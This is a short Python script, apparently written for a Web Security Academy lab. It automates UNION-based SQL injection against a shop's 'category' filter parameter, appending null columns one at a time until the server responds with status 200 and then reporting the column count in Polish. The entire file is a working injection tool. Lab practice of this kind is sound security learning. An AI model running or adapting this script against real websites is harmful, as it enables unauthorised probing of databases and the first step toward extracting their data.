#!/usr/bin/env python3
import urllib
import requests


def urlencode(tmp_url):
    return urllib.parse.quote(tmp_url)

def make_request():
   return requests.get(url + urlencode("-- -")).status_code

def add_null():
    global url
    url = url + urlencode(", null")

def run():
    global url
    for i in range(10):
        code = make_request()
        print(f"Url: {url + urlencode("-- -")}, i={i}, code={code}")
        if code == 200:
            print(f"[+] Ilosc kolumn: {i+1}.")
            return
        add_null()

payload ="' union select null"
url = f"https://0ad100cc0307e753841b0f2400a80006.web-security-academy.net/filter?category={urlencode(payload)}"

if __name__ == '__main__':
    run()

